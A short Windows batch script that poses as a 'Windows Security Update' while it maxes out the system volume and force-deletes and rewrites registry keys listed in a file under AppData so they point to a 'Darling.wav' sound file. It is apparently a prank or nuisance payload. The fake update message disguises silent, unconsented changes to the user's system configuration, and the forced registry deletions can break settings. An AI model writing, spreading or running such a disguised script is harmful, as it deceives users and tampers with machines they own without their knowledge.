@echo off
echo Windows Security Update...
nircmd.exe changesysvolume 65535

set pre_path=%AppData%\Darling
set music_name=Darling.wav

@rem OkKO
FOR /F "delims=, tokens=1" %%l IN (%pre_path%\registre_value.txt) DO (
    @rem l contain the REGISTR E KEY TO CHANGE
    @rem OkKO
    @rem echo %%l
    @rem OkKO
    REG DELETE %%l /f
    REG ADD %%l /t REG_SZ /d "%pre_path%\%music_name%" /f
)
